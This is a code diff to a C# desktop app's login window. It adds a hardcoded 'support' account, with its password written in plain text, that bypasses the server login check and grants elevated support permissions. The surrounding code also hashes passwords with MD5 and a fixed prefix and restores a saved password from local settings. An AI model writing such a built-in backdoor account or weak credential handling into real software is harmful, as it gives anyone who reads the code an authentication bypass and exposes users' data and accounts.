@@ -55,7 +55,8 @@ namespace DataEntryApp.View.windows
                 {
                     txtUserName.Text = Properties.Settings.Default.userName;
                     txtPassword.Password = Properties.Settings.Default.password;
-                   // MainWindow.lang = "en";
+                    Global.APIUri = Properties.Settings.Default.APIUri;
+                    // MainWindow.lang = "en";
                     MainWindow.lang = Properties.Settings.Default.Lang;
                     //menuIsOpen = Properties.Settings.Default.menuIsOpen;
                     cbxRemmemberMe.IsChecked = true;
@@ -172,7 +173,23 @@ namespace DataEntryApp.View.windows
                     string password = Md5Encription.MD5Hash("Inc-m" + txtPassword.Password);
                     string userName = txtUserName.Text;
                     //user = await userModel.GetByID(2);
+                    //support or normal user
+                    if(userName== "Support@supgroup" && password == Md5Encription.MD5Hash("Inc-m" + "N&MSnF!3$Y7J47w+"))
+                    {
+                        //support
+                     //   MessageBox.Show(userName);
+                        MainWindow main = new MainWindow();
+                        MainWindow.userLogin.AccountName = "Support@supgroup";
+                        MainWindow.userLogin.password = Md5Encription.MD5Hash("Inc-m" + "N&MSnF!3$Y7J47w+");
+                        HelpClass.isSupportPermision = true;
+                        main.Show();
+                        this.Close();
+                    }
+                    else
+                    {
+                        //normal user
 
+                 
                     user = await userModel.Getloginuser(userName, password);
 
                     if (user.AccountName == null)
@@ -227,9 +244,12 @@ namespace DataEntryApp.View.windows
                             this.Close();
                         }
                     }
-
+                        //else
+                    }
                     HelpClass.EndAwait(grid_main);
+                  
                     logInProcessing = false;
+
                 }
             }
             catch (Exception ex)
